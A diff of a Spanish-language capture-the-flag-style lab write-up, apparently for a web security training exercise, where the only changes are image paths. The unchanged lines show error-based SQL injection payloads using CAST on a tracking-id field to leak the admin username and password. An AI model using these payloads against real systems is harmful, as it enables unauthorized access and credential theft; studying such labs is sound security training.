@@ -11,13 +11,13 @@ Analizamos paso a paso cómo:
 Finalmente, utilizamos la información exfiltrada para iniciar sesión como administrador, completando así con éxito el laboratorio.
 Solucion 
 primero la comilla en tracking id
-![Pasted_image_20250703160109.png](Imagenes/Pasted_image_20250703160109.png)
+![Pasted_image_20250703160109.png](/Imagenes/Pasted_image_20250703160109.png)
 en BS vamos a realizar los demas pasos 
-![Pasted_image_20250703160230.png](Imagenes/Pasted_image_20250703160230.png)
+![Pasted_image_20250703160230.png](/Imagenes/Pasted_image_20250703160230.png)
 lo siguiente seria usar cast para ver el error priviligeado
 este puede ser uno usando limit
 ' or 1=cast((select username from users limit 1) as INT)-- -
-![Pasted_image_20250703160821.png](Imagenes/Pasted_image_20250703160821.png)
+![Pasted_image_20250703160821.png](/Imagenes/Pasted_image_20250703160821.png)
 y lo mismo para la contraseña
 ' or 1=cast((select password from users limit 1) as INT)-- -
-![Pasted_image_20250703160913.png](Imagenes/Pasted_image_20250703160913.png)
+![Pasted_image_20250703160913.png](/Imagenes/Pasted_image_20250703160913.png)
